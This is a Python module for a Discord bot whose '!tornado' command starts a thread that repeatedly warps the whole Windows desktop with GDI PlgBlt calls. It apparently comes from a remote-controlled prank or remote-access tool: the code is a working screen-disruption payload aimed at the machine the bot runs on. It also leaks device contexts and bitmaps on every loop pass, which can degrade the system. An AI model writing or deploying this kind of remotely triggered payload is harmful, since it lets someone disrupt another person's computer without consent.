import win32gui
import ctypes
import threading
import discord
import random
import time

is_running = False
thread = None

def run_tornado_effect():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    screen_size = win32gui.GetWindowRect(win32gui.GetDesktopWindow())
    left = screen_size[0]
    top = screen_size[1]
    right = screen_size[2]
    bottom = screen_size[3]

    lpppoint = ((left + 50, top - 50), (right + 50, top + 50), (left - 50, bottom - 50))

    while is_running:
        hdc = win32gui.GetDC(0)
        mhdc = win32gui.CreateCompatibleDC(hdc)
        hbit = win32gui.CreateCompatibleBitmap(hdc, sh, sw)
        holdbit = win32gui.SelectObject(mhdc, hbit)

        offset_x = random.randint(-10, 10)
        offset_y = random.randint(-10, 10)

        win32gui.PlgBlt(
            hdc,
            lpppoint,
            hdc,
            left - 20 + offset_x,
            top - 20 + offset_y,
            (right - left) + 40,
            (bottom - top) + 40,
            None,
            0,
            0,
        )
        time.sleep(0.01)

async def tornado(ctx, action):
    global is_running, thread

    if action == "start":
        if is_running:
            await ctx.send("Tornado effect is already running!")
            return
        is_running = True
        thread = threading.Thread(target=run_tornado_effect)
        thread.start()
        await ctx.send("Tornado effect started! Type `!tornado stop` to stop it.")

    elif action == "stop":
        if not is_running:
            await ctx.send("Tornado effect is not running!")
            return
        is_running = False
        if thread is not None:
            thread.join()
        await ctx.send("Tornado effect stopped.")

    elif action == "help":
        await ctx.send(
            "Use `!tornado start` to start the tornado effect.\n"
            "Use `!tornado stop` to stop the tornado effect."
        )

    else:
        await ctx.send("Invalid action. Use `start`, `stop`, or `help`.")
